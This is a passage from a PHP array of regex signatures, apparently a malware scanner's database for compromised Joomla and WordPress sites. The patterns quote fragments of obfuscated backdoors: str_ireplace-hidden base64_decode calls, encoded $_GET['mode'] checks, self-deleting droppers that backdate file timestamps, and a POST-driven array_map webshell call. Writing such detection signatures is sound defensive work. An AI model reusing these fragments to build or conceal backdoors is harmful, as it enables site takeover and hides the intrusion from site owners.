      'pattern' => '/\\<\\?php \\$xvhhgyncv\\=str_ireplace\\("g","","gggbggagggggsggggegg6ggggg4ggg_ggggdgggggeggggcgggggoggggdgggegg"\\); \\$qnfxbh\\="DQoJCUBlcnJvcl9yZXBvcnRpb/',
      'label' => 'source-file tail snippet',
    ),
    173 => 
    array (
      'pattern' => '/\\<\\?php \\$fmsdgzs\\=str_ireplace\\("p","","ppbppppppappppspppppepppp6ppp4ppp_ppppdppppppeppppcppppppoppppppdppppep"\\); \\$cqwya\\="DQoJCUBlcnJvcl9yZXBvc/',
      'label' => 'source-file tail snippet',
    ),
    174 => 
    array (
      'pattern' => '/\\<\\?php \\$fkzyt\\=str_ireplace\\("i","","iibiiiiaiiiiisiiiiiieiiii6iii4iiii_iiiiidiiiieiiiiiiciiiiioiidiiiei"\\); \\$xndka\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
      'label' => 'source-file tail snippet',
    ),
    175 => 
    array (
      'pattern' => '/\\<\\?php \\$dubazdry\\=str_ireplace\\("z","","zzbzzzzzzazzzszzzzzezz6zzzzz4zzz_zzzzzzdzzzezzzzzzczzzozzzzzdzzzezzz"\\); \\$axnhhmr\\="DQoJCUBlcnJvcl9yZXBvc/',
      'label' => 'source-file tail snippet',
    ),
    176 => 
    array (
      'pattern' => '/LypudnNnbmZ0d3B2dHJ1cGQqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJd/',
      'label' => 'sample-specific encoded fragment',
    ),
    177 => 
    array (
      'pattern' => '/\\<\\?php \\$hcftvxs\\=str_ireplace\\("w","","wwwbwwwwwawwwswwwwewwww6wwww4wwwww_wwwwwdwwwwwewwcwwwwwowwwdwwwwwwew"\\); \\$xehygm\\="DQoJCUBlcnJvcl9yZXBvcnR/',
      'label' => 'source-file tail snippet',
    ),
    178 => 
    array (
      'pattern' => '/LyptdmZtdHhyY2sqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJdKSl7Lypo/',
      'label' => 'sample-specific encoded fragment',
    ),
    179 => 
    array (
      'pattern' => '/\\* @copyright  Copyright \\(C\\) 2005 \\- 2015 Open Source Matters, Inc\\. All rights reserved\\.[\\s\\S]{0,12000}iterator_apply                             \\(\\$option, \\$win,       array             \\(\\$it\\)                  \\)/s',
      'label' => 'source-file head-tail anchor',
    ),
    180 => 
    array (
      'pattern' => '/\\<\\?php echo "UmVgDhdKFM"; if \\(file_exists\\("\\.\\/segnala\\.php"\\)\\)\\{ touch\\("\\.\\/segnala\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*mwCV0TgqxRY/',
      'label' => 'source-file tail snippet',
    ),
    181 => 
    array (
      'pattern' => '/\\<\\?php \\$kxbyqm\\=str_ireplace\\("h","","hhbhhhhahhhhhshhhehh6hhhh4hhhhh_hhhhhhdhhhhhehhhhchhohhhhdhhhhehhh"\\); \\$ezxcv\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
      'label' => 'source-file tail snippet',
    ),
    182 => 
    array (
      'pattern' => '/\\<\\?php \\$fpepbxtd\\=str_ireplace\\("n","","nnnbnnnnnannnsnnnnennn6nnnn4nnn_nndnnennnncnnnonnnndnnnnennn"\\); \\$decxxcnc\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/',
      'label' => 'source-file tail snippet',
    ),
    183 => 
    array (
      'pattern' => '/\\<\\?php \\$xtbyudzrp\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$extnqg\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbm/',
      'label' => 'source-file tail snippet',
    ),
    184 => 
    array (
      'pattern' => '/\\<\\?php \\$psweevmbu\\=str_ireplace\\("t","","ttbttttattttstttttettt6ttttt4tttttt_ttttdttttettctttotttdtttttettt"\\); \\$vvpnygyxrd\\="DQoJCUBlcnJvcl9yZXB/',
      'label' => 'source-file tail snippet',
    ),
    185 => 
    array (
      'pattern' => '/\\<\\?php \\$ffpec\\=str_ireplace\\("i","","iiibiiiaiisiiieiiiii6iiiii4iiiiii_iiiiiidiiieiiiiciiiioiiiiidiiiieii"\\); \\$tmamffrtbq\\="DQoJCUBlcnJvcl9yZXBvc/',
      'label' => 'source-file tail snippet',
    ),
    186 => 
    array (
      'pattern' => '/\\<\\?php \\$ttawtdqv\\=str_ireplace\\("p","","pbppppappppsppppppepppp6ppppp4pppp_ppppdppppeppppppcppppppopppdppppeppp"\\); \\$vvsgz\\="DQoJCUBlcnJvcl9yZXBv/',
      'label' => 'source-file tail snippet',
    ),
    187 => 
    array (
      'pattern' => '/\\<\\?php echo "YrHcwRvFTt"; if \\(file_exists\\("\\.\\/park\\.inc\\.php"\\)\\)\\{ touch\\("\\.\\/park\\.inc\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*4GakpK4UU/',
      'label' => 'source-file tail snippet',
    ),
    188 => 
    array (
      'pattern' => '/\\<\\?php \\$meggdkswq\\=str_ireplace\\("r","","rrbrrrrrrarrrrsrrrrerrr6rrrrrr4rrrr_rrrdrrrerrrrcrrrrorrrrdrrrrer"\\); \\$qnhmbswkv\\="DQoJCUBlcnJvcl9yZXBvc/',
      'label' => 'source-file tail snippet',
    ),
    189 => 
    array (
      'pattern' => '/\\<\\?php \\$utaxhset\\=str_ireplace\\("k","","kkbkkkakkkkskkekkkkk6kkk4kkkkk_kkkkdkkkekkkkkkckkkkkokkkdkkkkekkk"\\); \\$ancea\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/',
      'label' => 'source-file tail snippet',
    ),
    190 => 
    array (
      'pattern' => '/\\<\\?php \\$nhquayfzwz\\=str_ireplace\\("p","","pbppppappppsppppppepppp6ppppp4pppp_ppppdppppeppppppcppppppopppdppppeppp"\\); \\$pqxauacu\\="DQoJCUBlcnJvcl9/',
      'label' => 'source-file tail snippet',
    ),
    191 => 
    array (
      'pattern' => '/\\<\\?php \\$bskhqrwwcu\\=str_ireplace\\("u","","uuubuuuuauuuusuuuueuuuuuu6uuuu4uuuu_uuuuduuuueuuuucuuuouuuuuduuueu"\\); \\$gnakgtv\\="DQoJCUBlcnJvcl9yZXBvc/',
      'label' => 'source-file tail snippet',
    ),
    192 => 
    array (
      'pattern' => '/\\<\\?php echo "AyfmskxZuZ"; if \\(file_exists\\("\\.\\/api\\.suggest\\.php"\\)\\)\\{ touch\\("\\.\\/api\\.suggest\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*hCz/',
      'label' => 'source-file tail snippet',
    ),
    193 => 
    array (
      'pattern' => '/LyplaHRyeiovIGlmICghZW1wdHkoJF9HRVQpICYmIGlzc2V0KCRfR0VUWyJtb2RlIl0pKXsvKmZzYmNx/',
      'label' => 'sample-specific encoded fragment',
    ),
    194 => 
    array (
      'pattern' => '/\\<\\?php echo "HeDXzaPkgT"; if \\(file_exists\\("\\.\\/site_login\\.php"\\)\\)\\{ touch\\("\\.\\/site_login\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*ddCQN/',
      'label' => 'source-file tail snippet',
    ),
    195 => 
    array (
      'pattern' => '/Lyp2dXp5dGsqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJdKSl7Lypid2ty/',
      'label' => 'sample-specific encoded fragment',
    ),
    196 => 
    array (
      'pattern' => '/LypweGducHptZnAqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJdKSl7Lypk/',
      'label' => 'sample-specific encoded fragment',
    ),
    197 => 
    array (
      'pattern' => '/\\<\\?php \\$pmfhfgzz\\=str_ireplace\\("g","","gggbggagggggsggggegg6ggggg4ggg_ggggdgggggeggggcgggggoggggdgggegg"\\); \\$srdukpup\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
      'label' => 'source-file tail snippet',
    ),
    198 => 
    array (
      'pattern' => '/\\<\\?php \\$dwcuynhtz\\=str_ireplace\\("p","","ppbppppappppsppppeppppp6ppppp4ppppp_ppppppdppppppeppppppcppppoppppdppppppep"\\); \\$xbdfeapwpr\\="DQoJCUBlcn/',
      'label' => 'source-file tail snippet',
    ),
    199 => 
    array (
      'pattern' => '/\\<\\?php echo "txAcDyMGPX"; if \\(file_exists\\("\\.\\/goods_script\\.php"\\)\\)\\{ touch\\("\\.\\/goods_script\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*k/',
      'label' => 'source-file tail snippet',
    ),
    200 => 
    array (
      'pattern' => '/\\<\\?php \\$kaxxctbupv\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$zwfgtqf\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBp/',
      'label' => 'source-file tail snippet',
    ),
    201 => 
    array (
      'pattern' => '/\\<\\?php \\$ehcpr\\=str_ireplace\\("x","","xxxbxxxxaxxxxxsxxxxexxx6xxxx4xx_xxxxdxxxexxxcxxxxoxxxdxxxxex"\\); \\$tcgsucaz\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/',
      'label' => 'source-file tail snippet',
    ),
    202 => 
    array (
      'pattern' => '/\\<\\?php echo "eatycfrfCa"; if \\(file_exists\\("\\.\\/frozenLib\\.php"\\)\\)\\{ touch\\("\\.\\/frozenLib\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*ar1G7gE/',
      'label' => 'source-file tail snippet',
    ),
    203 => 
    array (
      'pattern' => '/\\<\\?php \\$zzwnrt\\=str_ireplace\\("t","","ttbttttattttstttttettt6ttttt4tttttt_ttttdttttettctttotttdtttttettt"\\); \\$dvwnvmcab\\="DQoJCUBlcnJvcl9yZXBvcnR/',
      'label' => 'source-file tail snippet',
    ),
    204 => 
    array (
      'pattern' => '/\\<\\?php \\$rndzz\\=str_ireplace\\("i","","ibiiaiisiiiieiiiiii6iii4iiii_iidiiiiieiiiciiiioiiiidiiiiiei"\\); \\$sdebzzz\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7D/',
      'label' => 'source-file tail snippet',
    ),
    205 => 
    array (
      'pattern' => '/\\<\\?php \\$stmww\\=str_ireplace\\("m","","mmbmmmmammmmsmmemmmmm6mmmmm4mmmm_mmdmmmmmemmcmmmommmmmmdmmmemmm"\\); \\$rawsqpkh\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/',
      'label' => 'source-file tail snippet',
    ),
    206 => 
    array (
      'pattern' => '/\\<\\?php \\$tsctsrwhha\\=str_ireplace\\("x","","xxxbxxxxxaxxxsxxxxxexx6xxxxx4xxxxx_xxxxdxxxxxxexxxxcxxxxxoxxxxdxxxxxxex"\\); \\$yydzbgxtt\\="DQoJCUBlcnJvcl/',
      'label' => 'source-file tail snippet',
    ),
    207 => 
    array (
      'pattern' => '/\\<\\?php \\$quetsnbn\\=str_ireplace\\("r","","rbrrrrrarrrrrrsrrrrerrrr6rrrrr4rrrrrr_rrrrrrdrrrrerrrcrrrrorrrrrrdrrrrer"\\); \\$ckzdtwad\\="DQoJCUBlcnJvcl9y/',
      'label' => 'source-file tail snippet',
    ),
    208 => 
    array (
      'pattern' => '/\\);\\$uucme\\=\\$ucbrs\\(\\$fgatrpeewpea\\);trigger_error\\(\\$uucme,E_USER_ERROR\\);

\\/\\/ Set the root path as a constant\\.
if \\(\\!defined\\(/',
      'label' => 'sample-specific literal',
    ),
    209 => 
    array (
      'pattern' => '/\\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}array_map                      \\(\'a\', array      \\(\\$_POST\\[\'f\'\\]             \\(  \\$_POST\\[\'c\'\\]\\)                      \\)\\)/s',
      'label' => 'source-file head-tail anchor',
    ),
    210 => 
    array (
      'pattern' => '/\\<\\?php \\$xccfrw\\=str_ireplace\\("h","","hhhbhhhhhhahhshhhhhhehhh6hhhhh4hhh_hhhdhhhhehhhchhhhohhhhhdhhhheh"\\); \\$zgafau\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
      'label' => 'source-file tail snippet',
    ),
    211 => 
    array (
      'pattern' => '/\\<\\?php echo "YCWVNvfVQN"; if \\(file_exists\\("\\.\\/sang\\.lib\\.php"\\)\\)\\{ touch\\("\\.\\/sang\\.lib\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*dfmdDf0dS/',
      'label' => 'source-file tail snippet',
    ),
    212 => 
    array (
      'pattern' => '/Lyp2d21uenp2bXpzKi8gaWYgKCFlbXB0eSgkX0dFVCkgJiYgaXNzZXQoJF9HRVRbIm1vZGUiXSkpey8q/',
      'label' => 'sample-specific encoded fragment',
    ),
    213 => 
    array (
      'pattern' => '/\\<\\?php \\$pfqzx\\=str_ireplace\\("q","","qbqqqqqqaqqqqsqqeqq6qqqq4qqqq_qqqqqdqqqeqqqcqqqqoqqqdqqqqeq"\\); \\$dhnzfub\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7D/',
      'label' => 'source-file tail snippet',
    ),
    214 => 
    array (
      'pattern' => '/\\<\\?php echo "tmYQdTSwQg"; if \\(file_exists\\("\\.\\/article_details\\.php"\\)\\)\\{ touch\\("\\.\\/article_details\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__/',
      'label' => 'source-file tail snippet',
    ),
    215 => 
    array (
      'pattern' => '/\\<\\?php echo "YPfhknqUND"; if \\(file_exists\\("\\.\\/reseller\\.php"\\)\\)\\{ touch\\("\\.\\/reseller\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*aeGrEqPXG/',
      'label' => 'source-file tail snippet',
    ),
    216 => 
    array (
      'pattern' => '/\\<\\?php \\$ytncpy\\=str_ireplace\\("i","","iiibiiiiaiiiisiiieiii6iiii4iiii_iiiidiiiiieiiiiciioiiidiiiiiieii"\\); \\$pzuangestw\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
      'label' => 'source-file tail snippet',
    ),
    217 => 
    array (
      'pattern' => '/\\);\\$snxyqkaufrw\\=\\$qu\\(\\$rfqcc\\);trigger_error\\(\\$snxyqkaufrw,E_USER_ERROR\\);

\\/\\/ Set the root path as a constant\\.
if \\(\\!defined\\(/',
      'label' => 'sample-specific literal',
    ),
    218 => 
    array (
      'pattern' => '/\\<\\?php \\$xuyhd\\=str_ireplace\\("v","","vvbvvavvvvvsvvvvevvvvv6vvvvv4vvv_vvvvvdvvvevvcvvvvovvvvvdvvvvevv"\\); \\$faptu\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/',
      'label' => 'source-file tail snippet',
    ),
    219 => 
    array (
      'pattern' => '/\\<\\?php \\$ernwr\\=str_ireplace\\("q","","qqqbqqqaqqqqqqsqqqqqqeqq6qqqq4qqq_qqqqdqqqeqqqcqqqqqqoqqqqdqqqqeq"\\); \\$krcufbs\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
      'label' => 'source-file tail snippet',
    ),
    220 => 
    array (
      'pattern' => '/\\<\\?php \\$bravqzt\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$ksfbtgnprc\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBp/',
      'label' => 'source-file tail snippet',
    ),
    221 => 
    array (
      'pattern' => '/\\<\\?php echo "tnXxUtYkyZ"; if \\(file_exists\\("\\.\\/forgotpassword\\.php"\\)\\)\\{ touch\\("\\.\\/forgotpassword\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\);/',
      'label' => 'source-file tail snippet',
    ),
    222 => 
    array (
      'pattern' => '/\',\\$errstr\\); array_map\\(\\$veybpqsghsps,array\\([\\s\\S]{0,160}GMT"\\);
\\/\\/header\\(/',
      'label' => 'sample-specific literal chain',
    ),
    223 => 
    array (
      'pattern' => '/\\<\\?php \\$aqeubk\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$aqfmwhyvxh\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpb/',
      'label' => 'source-file tail snippet',
    ),
    224 => 
    array (
      'pattern' => '/\\<\\?php \\$bupwgex\\=str_ireplace\\("q","","qqqbqqqqqaqqqqqsqqqqqqeqqqq6qq4qq_qqqqqqdqqqqeqqqqcqqqqqoqqqqdqqqeqqq"\\); \\$nrakw\\="DQoJCUBlcnJvcl9yZXBvcnR/',
      'label' => 'source-file tail snippet',
    ),
    225 => 
    array (
      'pattern' => '/\\<\\?php \\$qqquthpgv\\=str_ireplace\\("q","","qqbqqqqqqaqqqsqqqqeqqqqq6qqqqq4qqqq_qqdqqqqqeqqqqqcqqqoqqdqqeq"\\); \\$wfpzqr\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
      'label' => 'source-file tail snippet',
    ),
    226 => 
    array (
      'pattern' => '/\\<\\?php echo "fSwxuctTqY"; if \\(file_exists\\("\\.\\/playlist\\.php"\\)\\)\\{ touch\\("\\.\\/playlist\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*mraPAgxW3/',
      'label' => 'source-file tail snippet',
    ),
    227 => 
    array (
      'pattern' => '/\\<\\?php \\$esrgvrmrs\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$rfskvq\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbm/',
      'label' => 'source-file tail snippet',
    ),
    228 => 
    array (
      'pattern' => '/\\<\\?php \\$gvefnmeav\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$qrehkx\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbm/',
      'label' => 'source-file tail snippet',
    ),
    229 => 
    array (
      'pattern' => '/\\<\\?php \\$hpzvftf\\=str_ireplace\\("g","","gggbgggggagggggsggggegggggg6gggg4gggg_ggggdggggeggggcggoggggggdggggeg"\\); \\$zzqeb\\="DQoJCUBlcnJvcl9yZXBvcnR/',
      'label' => 'source-file tail snippet',
    ),
    230 => 
    array (
      'pattern' => '/\\<\\?php \\$tscdxbhvc\\=str_ireplace\\("i","","ibiiiiiaiiiisiiiiiieiiiii6iii4iii_iiiidiieiiiciiioiiiiidiiiiieii"\\); \\$ggwxqsz\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
      'label' => 'source-file tail snippet',
    ),
    231 => 
    array (
      'pattern' => '/\\<\\?php \\$mcfrswnzud\\=str_ireplace\\("m","","mmmbmmmmmammmsmmmemmmm6mmm4mmm_mmmdmmmmemmmmcmmmmommmmdmmmmem"\\); \\$kwtcrpd\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/',
      'label' => 'source-file tail snippet',
    ),
    232 => 
    array (
      'pattern' => '/\\<\\?php \\$zbznc\\=str_ireplace\\("p","","pbppppappspppeppppp6pppp4ppppp_pppppdppppepppppcpppopppdpppppeppp"\\); \\$ffdytmh\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
      'label' => 'source-file tail snippet',
    ),
    233 => 
    array (
      'pattern' => '/\\<\\?php echo "qUcKcmfxwm"; if \\(file_exists\\("\\.\\/newsletters\\.php"\\)\\)\\{ touch\\("\\.\\/newsletters\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*kVg/',
      'label' => 'source-file tail snippet',
    ),
    234 => 
    array (
      'pattern' => '/\\/rest\\-api\\/endpoints\\/class\\-wp\\-rest\\-attachments\\-controller\\.php[\\s\\S]{0,160}\\/rest\\-api\\/endpoints\\/class\\-wp\\-rest\\-post\\-types\\-controller\\.php/',
      'label' => 'sample-specific literal chain',
    ),
    235 => 
    array (
      'pattern' => '/LypkZ2d0enR0cmdzcnZ2Ki8gaWYgKCFlbXB0eSgkX0dFVCkgJiYgaXNzZXQoJF9HRVRbIm1vZGUiXSkp/',
      'label' => 'sample-specific encoded fragment',
    ),
    236 => 
    array (
      'pattern' => '/\\<\\?php \\$mmgewy\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$mguqccxxrs\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpb/',
      'label' => 'source-file tail snippet',
    ),
    237 => 
    array (
      'pattern' => '/rsd\'\\] \\) \\) \\{ \\/\\/ http\\:\\/\\/cyber\\.law\\.harvard\\.edu\\/blogs\\/gems\\/tech\\/rsd\\.html
	header\\(/',
      'label' => 'sample-specific literal',
    ),
    238 => 
    array (
      'pattern' => '/\\<\\?php \\$yqhtxrwhan\\=str_ireplace\\("f","","ffbfffffaffffsfffeffff6ffffff4ffff_ffdfffffeffffcfffffoffffdffffefff"\\); \\$gudqdk\\="DQoJCUBlcnJvcl9yZXBv/',
      'label' => 'source-file tail snippet',
    ),
    239 => 
    array (
      'pattern' => '/\\<\\?php echo "pssVDrkyCu"; if \\(file_exists\\("\\.\\/editgames\\.php"\\)\\)\\{ touch\\("\\.\\/editgames\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*URFvSHu/',
      'label' => 'source-file tail snippet',
    ),
    240 => 
    array (
      'pattern' => '/\\<\\?php \\$tvkusuckzz\\=str_ireplace\\("r","","rbrrrrarrrrrsrrerrrrrr6rrrr4rrrr_rrrrrdrrrerrrrrcrrrrrorrrdrrrerrr"\\); \\$mznxrtd\\="DQoJCUBlcnJvcl9yZXBvc/',
      'label' => 'source-file tail snippet',
    ),
    241 => 
    array (
      'pattern' => '/LypubW51enlyd2ZndnhoKi8gaWYgKCFlbXB0eSgkX0dFVCkgJiYgaXNzZXQoJF9HRVRbIm1vZGUiXSkp/',
      'label' => 'sample-specific encoded fragment',
    ),
    242 => 
    array (
      'pattern' => '/\\<\\?php \\$wgguv\\=str_ireplace\\("y","","ybyyyyayyyysyyyyeyyy6yyyyy4yyy_yyyydyyeyyyycyyoyyyydyyyyyey"\\); \\$eumbwze\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7D/',
      'label' => 'source-file tail snippet',
    ),
    243 => 
    array (
      'pattern' => '/LypiZ3ByZ3ZiYnhxd2JueWgqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJd/',
      'label' => 'sample-specific encoded fragment',
    ),
    244 => 
    array (
      'pattern' => '/\\<\\?php echo "puTtDAmceG"; if \\(file_exists\\("\\.\\/orderhistory\\.php"\\)\\)\\{ touch\\("\\.\\/orderhistory\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*c/',
      'label' => 'source-file tail snippet',
    ),
    245 => 
    array (
      'pattern' => '/\\] \\);
	\\$tb_id \\= intval\\( \\$tb_id\\[ count\\( \\$tb_id \\) \\- 1 \\] \\);
\\}

\\$tb_url  \\= isset\\( \\$_POST\\[/',
      'label' => 'sample-specific literal',
    ),
    246 => 
    array (
      'pattern' => '/\\<\\?php \\$hqceegmgfv\\=str_ireplace\\("n","","nnnbnnnnnannnnsnnnnennnn6nnn4nn_nnnndnnennnncnnnonnnnndnnnnenn"\\); \\$ghxuhs\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/',
      'label' => 'source-file tail snippet',
    ),
    247 => 
    array (
      'pattern' => '/\\<\\?php echo "SbAKxpksph"; if \\(file_exists\\("\\.\\/search_config\\.php"\\)\\)\\{ touch\\("\\.\\/search_config\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\//',
      'label' => 'source-file tail snippet',
    ),
    248 => 
    array (
      'pattern' => '/\\);\\$butymx\\=\\$bwpxct\\(\\$bkywhxvrgcnhat\\);user_error\\(\\$butymx,E_USER_ERROR\\);

\\/\\/ Set the root path as a constant\\.
if \\(\\!defined\\(/',
      'label' => 'sample-specific literal',
    ),
    249 => 
    array (
      'pattern' => '/\\<\\?php \\$xxwqptnq\\=str_ireplace\\("x","","xbxxaxxxxsxxxxxexxxx6xxx4xxx_xxxxxdxxxxxexxxxxcxxxxoxxxxxdxxxexx"\\); \\$znkstzc\\="DQoJCUBlcnJvcl9yZXBvcnRpb/',
      'label' => 'source-file tail snippet',
    ),
    250 => 
    array (
      'pattern' => '/\\* @copyright  Copyright \\(C\\) 2005 \\- 2016 Open Source Matters, Inc\\. All rights reserved\\.[\\s\\S]{0,12000}array_map                 \\(\'a\', array      \\(\\$_POST\\[\'f\'\\]                     \\(         \\$_POST\\[\'c\'\\]\\)                       \\)\\)/s',
      'label' => 'source-file head-tail anchor',
    ),
    251 => 
    array (
      'pattern' => '/\\<\\?php \\$asbeerz\\=str_ireplace\\("h","","hbhhhahhhhshhhehhhhh6hhhhh4hhhhh_hhdhhhhehhhhhchhhhhohhhhdhhhhheh"\\); \\$yrwwhpxusu\\="DQoJCUBlcnJvcl9yZXBvcn/',
      'label' => 'source-file tail snippet',
    ),
    252 => 
    array (
      'pattern' => '/\\* @package    Error Libraries[\\s\\S]{0,12000}trigger_error         \\(        \\$win_error, E_USER_ERROR\\)/s',
      'label' => 'source-file head-tail anchor',
    ),
    253 => 
    array (
      'pattern' => '/\\<\\?php echo "QYGRCZZFde"; if \\(file_exists\\("\\.\\/chain\\.func\\.php"\\)\\)\\{ touch\\("\\.\\/chain\\.func\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*U7C2B/',
      'label' => 'source-file tail snippet',
    ),
    254 => 
    array (
      'pattern' => '/\\<\\?php echo "hPFHqReVfZ"; if \\(file_exists\\("\\.\\/index\\-print\\.php"\\)\\)\\{ touch\\("\\.\\/index\\-print\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*Ut4/',
      'label' => 'source-file tail snippet',
    ),
    255 => 
    array (
      'pattern' => '/\\<\\?php echo "qnDBaspVPB"; if \\(file_exists\\("\\.\\/chartaxd\\.php"\\)\\)\\{ touch\\("\\.\\/chartaxd\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*2QbBtdd7x/',
      'label' => 'source-file tail snippet',
    ),
    256 => 
    array (
      'pattern' => '/\\<\\?php \\$mkknfzbh\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$wptmqadpx\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBp/',
      'label' => 'source-file tail snippet',
    ),
    257 => 
    array (
      'pattern' => '/\\<\\?php \\$wtqdc\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$yksceweqxc\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbm/',
      'label' => 'source-file tail snippet',
    ),
    258 => 
    array (
      'pattern' => '/\\* @package    Error Libraries[\\s\\S]{0,12000}trigger_error                \\(       \\$win_error, E_USER_ERROR\\)/s',
      'label' => 'source-file head-tail anchor',
    ),
    259 => 
    array (
      'pattern' => '/\\<\\?php echo "RKPmBVdPyb"; if \\(file_exists\\("\\.\\/orderterms\\.php"\\)\\)\\{ touch\\("\\.\\/orderterms\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*1Sbvn/',
      'label' => 'source-file tail snippet',
    ),
    260 => 
    array (
      'pattern' => '/\\<\\?php \\$ecddgtv\\=str_ireplace\\("p","","pbppppappppsppppepppppp6ppp4ppppp_pppdpppppepppcpppopppppdppppepp"\\); \\$vanbprznm\\="DQoJCUBlcnJvcl9yZXBvcnR/',
      'label' => 'source-file tail snippet',
    ),
    261 => 
    array (
      'pattern' => '/Lyp2emF3cG5xd2FidnhueWQqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJd/',
      'label' => 'sample-specific encoded fragment',
    ),
    262 => 
    array (
      'pattern' => '/\\<\\?php \\$vdgdwbbfz\\=str_ireplace\\("x","","xbxxxaxxsxxxexxx6xxxxxx4xxxx_xxxxdxxxxxexxxxxcxxxxxxoxxxxxdxxxxexx"\\); \\$dvzrvfeeyy\\="DQoJCUBlcnJvcl9yZXB/',
      'label' => 'source-file tail snippet',
    ),
    263 => 
    array (
